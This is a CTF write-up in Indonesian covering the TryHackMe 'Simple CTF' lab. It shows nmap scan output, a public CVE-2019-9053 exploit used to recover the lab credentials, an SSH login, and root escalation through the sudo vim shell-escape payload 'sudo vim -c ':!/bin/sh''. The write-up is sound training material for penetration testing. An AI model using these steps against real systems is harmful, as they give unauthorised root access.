---
title: "Tryhackme - Simple CTF WriteUps"
date: 2022-12-14 13:00:00 +07:00
categories: [WriteUps]
tags: [ctf, Tryhackme, pentest, writeups]
image: 
---

# Tryhackme - Simple CTF WriteUps

Pertama kali kita scanning Port yang terbuka dengan Nmap ```Nmap -sC -sV ‘Target’```. Setelah menscan kita dapat melihat Port terbuka yaitu port 21, 80, dan 2222.
```
$ nmap -sC -sV 10.10.98.22 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-13 22:54 PST
Nmap scan report for 10.10.98.22
Host is up (0.26s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.46.188
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.92 seconds
```
Disini kita mencoba melihat tampilan website pada port 80. Dan kita mendapatkan tampilan Apache2.

![image](https://media.discordapp.net/attachments/740245586095112242/1055005431703031868/image.png)

Sekarang kita mencoba fuzzing directory dengan dirsearch dan kita mendapatkan: ````/index.html```, ```/robots.txt, /simple```.

![image](https://media.discordapp.net/attachments/740245586095112242/1055005736247230514/image.png)

Kita coba membuka halaman baru dan menambahkan directory ```/simple```. Setelah kita searching secara dalam kita menemukan Vulnerability CVE-2019-9053 dan exploitnya saya dapatkan dari [github](https://github.com/e-renna/CVE-2019-9053).

![image](https://media.discordapp.net/attachments/740245586095112242/1055006129509384222/image.png)

Disini kita mencoba menjalankan dan exploit dengan exploit yang kita dapatkan tadi. Dengan ini kita bisa melihat user, password, dan email yang di hash dengan md5. Dan kita mendapatkan 
```
Username: mitch
Password: secret
Email: admin@admin.com
```
![image](https://media.discordapp.net/attachments/740245586095112242/1055006770373853184/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1055006940461281300/image.png)

Setelah kita mendapatkanya kita coba untuk login pada SSH port 2222 yang kita dapatkan dari scanning network dari Nmap tadi. Dan berhasil login, selanjutnya kita akan local privileges dengan cara melihat sudoers ```sudo -l``` untuk melihatnya dan kita dapat menjalankan ```/usr/bin/vim```

![image](https://media.discordapp.net/attachments/740245586095112242/1055007310969315409/image.png)
![image](https://media.discordapp.net/attachments/740245586095112242/1055007445166084197/image.png)

Disini kita mencoba exploit dengan payload yang didapat dari [GTFobins](https://gtfobins.github.io/gtfobins/vim/) yang payload ini: 
```
vim -c ':!/bin/sh' 
```
dapat dijalankan secara langsung dengan root untuk memanggil bash pada root.
![image](https://media.discordapp.net/attachments/740245586095112242/1055007970355859566/image.png)

Selanjutnya kita eksekusi dengan payload ini dan menambahkan sudo didepan payload ```sudo vim -c ‘:!/bin/sh’```. Dan berhasil kita telah mendapatkan root access pada server ini.

![image](https://media.discordapp.net/attachments/740245586095112242/1055008241555357736/image.png)
